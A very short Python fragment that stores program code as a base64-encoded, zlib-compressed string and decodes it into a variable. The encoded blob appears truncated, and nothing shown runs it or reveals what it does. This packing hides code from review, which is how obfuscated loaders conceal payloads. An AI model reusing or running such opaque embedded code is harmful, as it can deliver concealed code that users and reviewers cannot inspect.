import zlib, base64
from pathlib import Path
_CODE = zlib.decompress(base64.b64decode("""
eNo9V21v20YS/i8zCly9BLKs1/WLZMdJ6iZBmqA1ihRFU7QohpK5k5Uod8ntki6K/O+d4e4d5
""")).decode("utf-8")
